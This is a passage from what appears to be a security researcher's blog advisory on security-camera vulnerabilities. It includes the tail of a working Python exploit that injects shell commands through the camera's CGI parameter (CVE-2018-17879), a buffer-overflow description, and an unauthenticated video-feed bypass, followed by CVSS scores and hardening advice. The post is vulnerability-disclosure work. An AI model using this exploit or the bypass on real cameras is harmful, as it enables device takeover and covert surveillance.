</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;cmd&#34;</span>, type<span style="color:#f92672">=</span>str, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;the cmd to exec, e.g. &#39;ls /&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>cyan(<span style="color:#e6db74">&#34;[~] Exploit for CVE-2018-17879&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    execCmd(args<span style="color:#f92672">.</span>url, args<span style="color:#f92672">.</span>cmd)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execCmd</span>(target, command):
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>green(<span style="color:#e6db74">&#34;[~] Executing command &#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;...&#34;</span> <span style="color:#f92672">%</span> (command)))
</span></span><span style="display:flex;"><span>    percentCommand <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(command)
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/cgi-bin/admin/param?action=update&amp;General.Network.UPnP.NATTraversal.HTTPPort=1</span><span style="color:#e6db74">%%</span><span style="color:#e6db74">3e/dev/null</span><span style="color:#e6db74">%%</span><span style="color:#e6db74">202</span><span style="color:#e6db74">%%</span><span style="color:#e6db74">3e/dev/null;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">;false&#34;</span> <span style="color:#f92672">%</span> (target, percentCommand), verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    print(r<span style="color:#f92672">.</span>text[:<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>])
</span></span><span style="display:flex;"><span>    print(huepy<span style="color:#f92672">.</span>yellow(<span style="color:#e6db74">&#34;[~] Cleaning up...&#34;</span>))
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/cgi-bin/admin/param?action=update&amp;General.Network.UPnP.NATTraversal.HTTPPort=1337&#34;</span> <span style="color:#f92672">%</span> (target), verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><h4 id="evaluation-2">Evaluation<a href="#evaluation-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>CVSS v2: <a href="https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:L/Au:S/C:C/I:C/A:C)">AV:N/AC:L/Au:S/C:C/I:C/A:C</a> = Base Score <strong>9.0</strong></p>
<h3 id="cve-2018-17878">CVE-2018-17878<a href="#cve-2018-17878" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Remote code execution through buffer overflows</p>
<h4 id="description-3">Description<a href="#description-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Almost all of the CGI scripts used by the web server take user input to know what to do. The function that is internally responsible for copying this input is sprintf(). This function is vulnerable to a <a href="https://en.wikipedia.org/wiki/Buffer_overflow">buffer overflow</a>. This allows an attacker, by typing in a specially crafted string, to write over the memory allocated to it, and thus gain complete control of the program and achieve code execution as root.</p>
<h4 id="exploitation-3">Exploitation<a href="#exploitation-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Depending on the binary, buffer size and stack; as no security protections like <a href="https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/">stack canaries</a> or <a href="https://ctf101.org/binary-exploitation/no-execute/">NX / Data Execution Prevention</a> are in place, this could be easily done via either <a href="https://www.techtarget.com/searchsecurity/answer/What-is-the-relationship-between-shellcode-and-exploit-code">Shellcode</a> or <a href="https://secureteam.co.uk/2020/09/18/how-return-oriented-programming-exploits-work/">ROP</a>.</p>
<h4 id="evaluation-3">Evaluation<a href="#evaluation-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>CVSS v2: <a href="https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:H/Au:S/C:C/I:C/A:C)">AV:N/AC:H/Au:S/C:C/I:C/A:C</a> = Base Score <strong>7.1</strong></p>
<h3 id="cve-2018-17559">CVE-2018-17559<a href="#cve-2018-17559" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Access control bypass</p>
<h4 id="description-4">Description<a href="#description-4" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>The web server gets the camera feed from the CGI script <code>/opt/cgi/jpg/image</code>. This script delivers the current frame every second. This script is symlinked to many places in the file system. Among others to <code>/cgi-bin/admin/image</code>, <code>/cgi-bin/admin/image.jpg</code>, <code>/tmp/video.mp4</code>, <code>/cgi-bin/operator/image.jpg</code>.</p>
<p>Most of these endpoints are password protected in the configuration file of the webserver, <code>boa.conf</code>. However, on lines 314-321 it can be seen that after the script and the symlinks to the script are password protected, they are transferred somewhere else again, and these new endpoints are not password protected:</p>
<pre tabindex="0"><code># boa.conf, L314-321
Auth /cgi-bin/jpg /var/www/secret.passwd

# [...]

Transfer /video.mp4 /tmp/video.mp4
Transfer /video.3gp /tmp/video.mp4
Transfer /video.mjpg /tmp/video.mp4
Transfer /video.h264 /tmp/video.mp4
</code></pre><p>This results in an attacker accessing <code>/video.mp4</code> or <code>/video.mjpg</code> being able to view the video feed without the need to authenticate.</p>
<h4 id="exploitation-4">Exploitation<a href="#exploitation-4" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Access <code>/video.mp4</code> or <code>/video.mjpg</code> to see the video feed without authentication.</p>
<h4 id="evaluation-4">Evaluation<a href="#evaluation-4" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>As the video stream is the most important output of a security camera, being able to circumvent the protection of the video stream is critical, especially taking into consideration what direction and perspective the camera is facing.</p>
<p>CVSS v2: <a href="https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:L/Au:N/C:C/I:N/A:N)">AV:N/AC:L/Au:N/C:C/I:N/A:N</a> = Base Score <strong>7.8</strong></p>
<h2 id="overall-evaluation--conclusion">Overall Evaluation &amp; Conclusion<a href="#overall-evaluation--conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>An attacker can completely take over the camera, attack the internal network (private or company network), launch further attacks from the camera, change or delete the image of the camera, or completely disable the camera, as well as put the camera completely out of operation. This could be particularly problematic in security-critical scenarios, e.g., criminal acts that are recorded and documented by the camera, as evidence could be lost.</p>
<p>While the replacement program may give end users new cameras (which are hopefully not prone to the security issues described here, but I didn&rsquo;t test that), the risk of having a always-on security device with weak hardware and network access persists. Please put such devices in a separate network or <a href="https://www.techtarget.com/searchnetworking/definition/virtual-LAN">VLAN</a>, protect it with firewall rules, and avoid credential reusage. Reviewing if you really need cameras connected to the internet could be another important step in becoming more secure.</p>

      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>&copy; 2018-2023 Martin "maride" Dessauer</span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
